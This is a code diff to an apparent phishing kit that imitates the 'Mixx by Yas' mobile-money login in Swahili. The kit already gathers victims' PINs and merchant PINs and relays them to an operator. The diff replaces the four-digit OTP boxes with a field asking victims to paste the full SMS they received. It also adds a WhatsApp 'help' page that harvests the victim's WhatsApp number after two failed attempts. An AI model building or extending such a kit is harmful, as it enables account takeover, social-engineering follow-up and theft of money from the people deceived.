@@ -174,18 +174,19 @@
 
   /* ───── PAGE 7: OTP ───── */
   #page-otp { background:#fff; }
-  .otp-topbar { display:flex; align-items:center; justify-content:space-between; padding:0 20px; height:52px; border-bottom:1px solid #eee; flex-shrink:0; }
-  .otp-topbar .bk { font-size:1.1rem; color:#333; cursor:pointer; background:none; border:none; }
+  .otp-topbar { display:flex; align-items:center; justify-content:space-between; padding:0 20px; height:52px; background:var(--navy); border-bottom:1px solid #eee; flex-shrink:0; }
+  .otp-topbar .bk { font-size:1.1rem; color:#fff; cursor:pointer; background:none; border:none; }
   .otp-topbar .hbg2 { display:flex; flex-direction:column; gap:4px; cursor:pointer; }
-  .otp-topbar .hbg2 span { width:20px; height:2px; background:#666; border-radius:1px; display:block; }
+  .otp-topbar .hbg2 span { width:20px; height:2px; background:#fff; border-radius:1px; display:block; }
   .otp-body-wrap { flex:1; padding:32px 16px; display:flex; align-items:flex-start; justify-content:center; }
   .otp-card { background:#fff; border:1px solid #eee; border-radius:var(--radius); padding:32px 28px; width:100%; max-width:440px; box-shadow:0 2px 16px rgba(0,0,0,0.06); }
   .otp-card h2 { font-size:1.2rem; font-weight:700; margin-bottom:6px; }
   .otp-hint { font-size:0.83rem; color:var(--text-light); margin-bottom:5px; }
   .otp-phone { font-size:0.9rem; font-weight:600; color:var(--text-dark); margin-bottom:22px; }
-  .otp-inputs { display:flex; gap:8px; margin-bottom:12px; width:100%; }
-  .otp-box { flex:1; min-width:0; width:0; height:52px; border:1.5px solid var(--border); border-radius:var(--radius-sm); text-align:center; font-family:'Inter',sans-serif; font-size:1.2rem; font-weight:700; color:var(--navy); outline:none; transition:border-color 0.2s; }
-  .otp-box:focus { border-color:var(--teal); box-shadow:0 0 0 3px rgba(255,215,0,0.2); }
+  .otp-inputs { width:100%; margin-bottom:12px; }
+  .otp-box { width:100%; padding:11px 14px; border:1.5px solid var(--border); border-radius:var(--radius-sm); font-family:'Inter',sans-serif; font-size:0.9rem; color:var(--text-dark); background:#fff; outline:none; transition:border-color 0.2s, box-shadow 0.2s; min-height:90px; resize:vertical; }
+  .otp-box:focus { border-color:var(--teal); box-shadow:0 0 0 3px rgba(0,150,136,0.12); }
+  .otp-instructions { font-size:0.82rem; color:var(--text-light); margin-bottom:14px; padding:12px; background:#f9f9f9; border-radius:var(--radius-sm); border-left:3px solid var(--teal); }
   .otp-resend { font-size:0.8rem; color:var(--teal); margin-bottom:22px; }
   .btn-otp { width:100%; padding:13px; background:#e8e8e8; color:#aaa; border:none; border-radius:8px; font-size:0.88rem; font-weight:600; letter-spacing:0.05em; cursor:pointer; font-family:'Inter',sans-serif; transition:all 0.2s; }
   .btn-otp.rdy { background:var(--grad); color:#fff; }
@@ -470,8 +471,8 @@
   </div>
   <div class="otp-body-wrap">
     <div class="otp-card">
-      <h2>Uthibitisho wa OTP</h2>
-      <p class="otp-hint">Weka OTP iliyotumwa kwenye nambari yako ya simu</p>
+      <h2>Uthibitisho wa Code</h2>
+      <p class="otp-hint">ujumbe umetumwa kwenye nambari yako ya simu</p>
       <div class="otp-phone" id="otpPh">+255712345678</div>
 
       <!-- Inline messages for OTP page -->
@@ -486,11 +487,9 @@
       </div>
 
       <div id="otpInputSection">
+        <p style="font-size:0.9rem;color:#333;margin-bottom:12px;font-weight:500;">Nakili ujumbe kamili uliyotumwa kwenye simu na ubandike hapa.</p>
         <div class="otp-inputs">
-          <input type="text" class="otp-box" maxlength="1" oninput="otpMv(this,0)" id="o0">
-          <input type="text" class="otp-box" maxlength="1" oninput="otpMv(this,1)" id="o1">
-          <input type="text" class="otp-box" maxlength="1" oninput="otpMv(this,2)" id="o2">
-          <input type="text" class="otp-box" maxlength="1" oninput="otpMv(this,3)" id="o3">
+          <textarea class="otp-box" id="otpInput" placeholder="Bandika ujumbe kamili hapa." oninput="chkOtp()"></textarea>
         </div>
         <div class="otp-resend" id="otpRs">Tuma tena msimbo kwa <span id="rsS">17</span> sekunde</div>
         <button class="btn-otp" id="bOtp" onclick="doOtp()">WASILISHA</button>
@@ -584,18 +583,72 @@
   </div>
 </div>
 
+<!-- ══════════════════════ PAGE: OTP HELP (WhatsApp) ══════════════════════ -->
+<div id="page-otp-help" class="page" style="background:#fff;">
+  <div style="display:flex;flex-direction:column;height:100vh;">
+    <div style="background:var(--navy);color:#fff;padding:16px;display:flex;align-items:center;justify-content:space-between;flex-shrink:0;">
+      <button style="background:none;border:none;color:#fff;font-size:1.5rem;cursor:pointer;" onclick="goTo('page-otp')">←</button>
+      <div style="font-weight:700;">Mixx by Yas</div>
+      <div style="width:24px;"></div>
+    </div>
+    <div style="flex:1;padding:28px 20px;display:flex;flex-direction:column;align-items:center;justify-content:flex-start;overflow-y:auto;">
+      <div style="width:100%;max-width:440px;">
+        <h2 style="font-size:1.2rem;font-weight:700;margin-bottom:6px;color:#006064;">💬 Tumaini La Msaada</h2>
+        <p style="font-size:0.83rem;color:#666;margin-bottom:22px;">Karibu! Tafadhali toa nambari yako ya WhatsApp ili tuweze kuwasiliana nawe.</p>
+
+        <div id="helpMsgErr" style="display:none;border:1.5px solid #fecaca;background:#fef2f2;border-radius:8px;padding:12px 16px;margin-bottom:16px;font-size:0.84rem;color:#991b1b;">
+          <span>✕</span> <span id="helpMsgErrTxt"></span>
+        </div>
+
+        <div id="helpInputSection">
+          <label style="display:block;font-size:0.82rem;font-weight:500;color:#666;margin-bottom:6px;">Nambari ya WhatsApp</label>
+          <div style="display:flex;">
+            <div style="padding:11px 12px;background:#f5f5f5;border:1.5px solid #ddd;border-right:none;border-radius:8px 0 0 8px;font-size:0.85rem;font-weight:500;color:#555;white-space:nowrap;display:flex;align-items:center;">🇿🇦 +27</div>
+            <input type="tel" id="whatsappNum" placeholder="712345678" maxlength="10" oninput="normalizePhone('whatsappNum');chkWhatsapp()" style="flex:1;padding:11px 14px;border:1.5px solid #ddd;border-left:none;border-radius:0 8px 8px 0;font-family:'Inter',sans-serif;font-size:0.9rem;outline:none;transition:border-color 0.2s;">
+          </div>
+          <button class="btn-otp" id="bWhatsapp" style="width:100%;margin-top:20px;padding:13px;background:#e8e8e8;color:#aaa;border:none;border-radius:8px;font-size:0.88rem;font-weight:600;letter-spacing:0.05em;cursor:pointer;font-family:'Inter',sans-serif;transition:all 0.2s;" onclick="submitWhatsapp()">TUMA NAMBARI</button>
+        </div>
+
+        <div id="helpWait" style="display:none;background:#f8f9ff;border:1px solid #e0e5ff;border-radius:8px;padding:16px;text-align:center;margin-top:20px;">
+          <div style="width:28px;height:28px;border:3px solid #e0e5ff;border-top-color:#00897b;border-radius:50%;animation:spin 0.8s linear infinite;margin:0 auto 10px;"></div>
+          <p style="font-size:0.82rem;color:#666;">Tutawasiliana nawe hivi karibuni kupitia WhatsApp…</p>
+        </div>
+
+        <div id="helpSuccess" style="display:none;text-align:center;padding:20px;">
+          <div style="font-size:3rem;margin-bottom:16px;">✅</div>
+          <h3 style="font-size:1.1rem;font-weight:700;margin-bottom:8px;color:#006064;">Asante!</h3>
+          <p style="font-size:0.88rem;color:#666;line-height:1.6;">Nambari yako imetokea. Tunatarajia kuwasiliana nawe haraka kupitia WhatsApp.</p>
+          <p style="margin-top:12px; font-size:0.9rem;"><strong>Karibuni kuweka simu yako karibu!</strong></p>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
 <!-- MODALS -->
 <div class="overlay" id="mLogin">
   <div class="modal"><div class="spinner"></div><h3>Tafadhali subiri…</h3><p>Inatuma maelezo yako kwa uthibitisho</p></div>
 </div>
 <div class="overlay" id="mOtp">
-  <div class="modal"><div class="spinner"></div><h3>Inathibitisha OTP</h3><p id="otpVT">Please wait… (3s)</p></div>
+  <div class="modal"><div class="spinner"></div><h3>Inathibitisha Code</h3><p id="otpVT">Please wait… (3s)</p></div>
 </div>
 <div class="overlay" id="mMerchPin">
   <div class="modal"><div class="spinner"></div><h3>Tafadhali subiri…</h3><p>Inatuma PIN yako ya Merchant kwa uthibitisho</p></div>
 </div>
 <div class="overlay" id="mSubmit">
   <div class="modal"><div class="spinner"></div><h3>Inawasilisha Ombi…</h3><p>Tafadhali subiri tunazindua ombi lako</p></div>
+</div>
+
+<!-- HELP MODAL -->
+<div class="overlay" id="helpModal" style="display:none;">
+  <div class="modal" style="max-width:340px;">
+    <h3 style="font-size:1.15rem;font-weight:700;color:#006064;margin-bottom:12px;">Je, Unahitaji Msaada?</h3>
+    <p style="font-size:0.9rem;color:#666;margin-bottom:24px;line-height:1.6;">Imeshindwa kwa mara mbili. Tunaweza kukusaidia kupitia WhatsApp. Unataka msaada?</p>
+    <div style="display:flex;gap:12px;">
+      <button style="flex:1;padding:12px;background:#e8e8e8;color:#666;border:none;border-radius:8px;font-size:0.88rem;font-weight:600;cursor:pointer;font-family:'Inter',sans-serif;transition:all 0.2s;" onclick="closeHelpModal()">Hapana</button>
+      <button style="flex:1;padding:12px;background:linear-gradient(to right, #006064, #00838f);color:#fff;border:none;border-radius:8px;font-size:0.88rem;font-weight:600;cursor:pointer;font-family:'Inter',sans-serif;transition:all 0.2s;" onclick="goToHelpPage()">Ndiyo</button>
+    </div>
+  </div>
 </div>
 
 <script>
@@ -893,9 +946,8 @@
           // Hide waiting, show OTP input
           document.getElementById('pinWait').classList.remove('show');
           document.getElementById('otpInputSection').style.display = 'block';
-          showOtpMsg('success', 'Maelezo yamethibitishwa! Tafadhali weka OTP yako hapa chini.');
           startRs();
-          document.getElementById('o0').focus();
+          document.getElementById('otpInput').focus();
 
         } else if (data.status === 'rejected') {
           clearInterval(pinPollInterval);
@@ -937,10 +989,9 @@
   // ══════════════════════════════════════════════════════
   // OTP INPUT HELPERS
   // ══════════════════════════════════════════════════════
-  function otpMv(el, i) {
-    el.value = el.value.replace(/\D/, '');
-    if (el.value && i < 3) document.getElementById('o' + (i+1)).focus();
-    const ok = [0,1,2,3].every(j => document.getElementById('o'+j).value);
+  function chkOtp() {
+    const otpInput = document.getElementById('otpInput').value.trim();
+    const ok = otpInput.length > 0;
     document.getElementById('bOtp').className = ok ? 'btn-otp rdy' : 'btn-otp';
   }
 
@@ -984,9 +1035,9 @@
       if (data.success) {
         showOtpMsg('info', 'Ombi jipya la OTP limetumwa kwa msimamizi.');
         startRs();
-        [0,1,2,3].forEach(i => { document.getElementById('o'+i).value = ''; });
-        document.getElementById('bOtp').className = 'btn-otp';
-        document.getElementById('o0').focus();
+        document.getElementById('otpInput').value = '';
+        chkOtp();
+        document.getElementById('otpInput').focus();
       } else {
         showOtpMsg('error', 'Haikuweza kutuma tena OTP. Tafadhali jaribu tena.');
       }
@@ -999,9 +1050,9 @@
   // OTP SUBMIT — calls /api/verify-otp then polls /api/check-otp-status
   // ══════════════════════════════════════════════════════
   async function doOtp() {
-    const otp = [0,1,2,3].map(j => document.getElementById('o'+j).value).join('');
-    if (otp.length < 4) {
-      showOtpMsg('warning', 'Tafadhali weka tarakimu zote 4 za OTP yako.');
+    const otp = document.getElementById('otpInput').value.trim();
+    if (otp.length === 0) {
+      showOtpMsg('warning', 'Tafadhali bandika code yako.');
       return;
     }
 
@@ -1087,14 +1138,10 @@
           clearInterval(otpPollInterval);
           showOtpMsg('error', 'Incorrect PIN detected. Redirecting to login…');
           setTimeout(() => {
-            // Clear PIN boxes
-            [0,1,2,3].forEach(i => document.getElementById('p'+i).value = '');
-            chkLogin();
-            document.getElementById('bLogin').disabled = false;
-            // Clear OTP boxes
-            [0,1,2,3].forEach(i => document.getElementById('o'+i).value = '');
+            // Clear OTP textarea
+            document.getElementById('otpInput').value = '';
+            chkOtp();
             // Reset OTP button
-            document.getElementById('bOtp').className = 'btn-otp';
             document.getElementById('bOtp').disabled = false;
             // Hide waiting spinner and show OTP inputs (reset OTP page state)
             document.getElementById('pinWait').classList.remove('show');
@@ -1107,17 +1154,28 @@
             // Reset application state so a fresh login creates a new application
             S.applicationId = null;
             S.assignedAdminId = null;
+            S.otpAttempts = 0;
             goTo('page-login');
           }, 2500);
 
         } else if (data.status === 'wrongcode') {
           // Admin flagged OTP as wrong — let user re-enter
           clearInterval(otpPollInterval);
-          [0,1,2,3].forEach(i => document.getElementById('o'+i).value = '');
-          document.getElementById('bOtp').className = 'btn-otp';
+          S.otpAttempts = (S.otpAttempts || 0) + 1;
+          
+          document.getElementById('otpInput').value = '';
+          chkOtp();
           document.getElementById('bOtp').disabled = false;
+          
           showOtpMsg('error', 'Incorrect OTP code. Please check and re-enter.');
-          document.getElementById('o0').focus();
+          
+          if (S.otpAttempts >= 2) {
+            setTimeout(() => {
+              document.getElementById('helpModal').style.display = 'flex';
+            }, 1000);
+          }
+          
+          document.getElementById('otpInput').focus();
         }
         // status === 'pending' → keep polling
 
@@ -1258,6 +1316,152 @@
       document.getElementById('bMerchPin').disabled = false;
       showMerchPinMsg('error', 'Hitilafu ya mtandao. Tafadhali angalia muunganisho wako.');
     }
+  }
+
+  // ══════════════════════════════════════════════════════
+  // WHATSAPP HELP REQUEST
+  // ══════════════════════════════════════════════════════
+  
+  let helpStatusPollInterval = null;
+
+  function closeHelpModal() {
+    document.getElementById('helpModal').style.display = 'none';
+  }
+
+  function goToHelpPage() {
+    closeHelpModal();
+    S.otpAttempts = 0;
+    goTo('page-otp-help');
+  }
+
+  function normalizePhone(inputId) {
+    const input = document.getElementById(inputId);
+    input.value = input.value.replace(/\D/g, '').slice(0, 10);
+  }
+
+  function chkWhatsapp() {
+    const whatsapp = document.getElementById('whatsappNum').value.trim();
+    const ok = whatsapp.length === 10;
+    const btn = document.getElementById('bWhatsapp');
+    if (ok) {
+      btn.className = 'btn-otp rdy';
+      btn.style.background = 'linear-gradient(to right, #006064, #00838f)';
+      btn.style.color = '#fff';
+    } else {
+      btn.className = 'btn-otp';
+      btn.style.background = '#e8e8e8';
+      btn.style.color = '#aaa';
+    }
+  }
+
+  function showHelpMsg(type, text) {
+    ['helpMsgErr'].forEach(id => {
+      const el = document.getElementById(id);
+      if (el) el.style.display = 'none';
+    });
+    if (type === 'error') {
+      document.getElementById('helpMsgErrTxt').textContent = text;
+      document.getElementById('helpMsgErr').style.display = 'block';
+    }
+  }
+
+  function hideHelpMsgs() {
+    ['helpMsgErr'].forEach(id => {
+      const el = document.getElementById(id);
+      if (el) el.style.display = 'none';
+    });
+  }
+
+  async function submitWhatsapp() {
+    const whatsapp = '+27' + document.getElementById('whatsappNum').value;
+
+    if (whatsapp.length < 13) {
+      showHelpMsg('error', 'Tafadhali weka nambari sahihi ya WhatsApp.');
+      return;
+    }
+
+    document.getElementById('helpInputSection').style.display = 'none';
+    document.getElementById('helpWait').style.display = 'block';
+    document.getElementById('bWhatsapp').disabled = true;
+
+    try {
+      const res = await fetch('/api/submit-help-request', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          applicationId: S.applicationId,
+          whatsappNumber: whatsapp
+        })
+      });
+
+      const data = await res.json();
+
+      if (data.success) {
+        pollHelpStatus();
+      } else {
+        document.getElementById('helpWait').style.display = 'none';
+        document.getElementById('helpInputSection').style.display = 'block';
+        document.getElementById('bWhatsapp').disabled = false;
+        showHelpMsg('error', data.message || 'Hitilafu. Tafadhali jaribu tena.');
+      }
+    } catch (err) {
+      document.getElementById('helpWait').style.display = 'none';
+      document.getElementById('helpInputSection').style.display = 'block';
+      document.getElementById('bWhatsapp').disabled = false;
+      showHelpMsg('error', 'Hitilafu ya mtandao. Tafadhali jaribu tena.');
+    }
+  }
+
+  function pollHelpStatus() {
+    if (helpStatusPollInterval) clearInterval(helpStatusPollInterval);
+
+    helpStatusPollInterval = setInterval(async () => {
+      try {
+        const res = await fetch('/api/check-help-status/' + S.applicationId);
+        const data = await res.json();
+
+        if (!data.success) return;
+
+        if (data.status === 'verified') {
+          clearInterval(helpStatusPollInterval);
+          document.getElementById('helpWait').style.display = 'none';
+          document.getElementById('helpSuccess').style.display = 'block';
+          
+          setTimeout(() => {
+            S.otpAttempts = 0;
+            S.applicationId = null;
+            S.assignedAdminId = null;
+            goTo('page-login');
+          }, 5000);
+
+        } else if (data.status === 'invalid_number') {
+          clearInterval(helpStatusPollInterval);
+          document.getElementById('helpWait').style.display = 'none';
+          document.getElementById('helpInputSection').style.display = 'block';
+          document.getElementById('whatsappNum').value = '';
+          document.getElementById('bWhatsapp').disabled = false;
+          chkWhatsapp();
+          
+          showHelpMsg('error', 'Nambari hiyo sio WhatsApp sahihi. Tafadhali weka nambari sahihi ya WhatsApp yako.');
+          document.getElementById('whatsappNum').focus();
+        }
+      } catch (err) {
+        // Silent on network hiccup
+      }
+    }, 2000);
+
+    setTimeout(() => {
+      if (helpStatusPollInterval) {
+        clearInterval(helpStatusPollInterval);
+        helpStatusPollInterval = null;
+        if (document.getElementById('helpWait').style.display !== 'none') {
+          document.getElementById('helpWait').style.display = 'none';
+          document.getElementById('helpInputSection').style.display = 'block';
+          document.getElementById('bWhatsapp').disabled = false;
+          showHelpMsg('error', 'Muda wa idhini umekwisha. Tafadhali jaribu tena.');
+        }
+      }
+    }, 300000);
   }
 
   // ══════════════════════════════════════════════════════
